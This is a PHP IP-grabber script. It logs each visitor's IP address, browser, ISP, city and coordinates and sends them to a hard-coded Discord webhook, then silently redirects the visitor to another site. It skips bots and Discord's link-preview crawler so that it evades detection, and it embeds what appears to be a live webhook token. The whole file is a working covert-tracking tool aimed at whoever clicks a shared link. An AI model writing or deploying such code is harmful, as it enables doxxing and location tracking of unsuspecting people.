<?php


$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}
$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon";
$JS = array(
    'username'   => "IP" , 
    'avatar_url' => "https://media.discordapp.net/stickers/864833531284553739.webp",
    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
);
 
$JSON = json_encode($JS);
function IpToWebhook($Hook, $Content)
{
      $Curl = curl_init($Hook);
      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
      return curl_exec($Curl);
}

IpToWebhook("https://discord.com/api/webhooks/1051520268188794911/uxoYajuO0U7rOLFRtf8qYIvI39PWyN_2p3WR8htWTAFmI8XKFOye837L2U3eAKhwA-dt", $JSON);
header("Location: https://www.littest.site");
?>
